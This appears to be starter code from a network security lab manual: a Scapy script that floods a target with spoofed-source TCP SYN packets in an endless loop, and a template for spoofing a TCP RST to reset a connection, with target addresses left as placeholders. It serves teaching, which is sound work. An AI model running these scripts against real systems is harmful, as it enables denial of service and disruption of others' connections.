# the code exerpted from the lab manual to save your time

# Task 1.1 ----------------------------------------------------
#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="*.*.*.*")
tcp = TCP(dport=**, flags='S')
pkt = ip/tcp

while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source ip
  pkt[TCP].sport = getrandbits(16) # source port
  pkt[TCP].seq = getrandbits(32) # sequence number
  send(pkt, iface = 'eth0', verbose = 0)

# Task 1.2 ----------------------------------------------------
# use synflood.c

# Task 2.1 ----------------------------------------------------
# Launching the attack manually
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@, dport=@@, flags="R", seq=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="eth0", verbose=0)

# Task 2.2 ----------------------------------------------------
#  Launching the attack automatically
# check lecture code


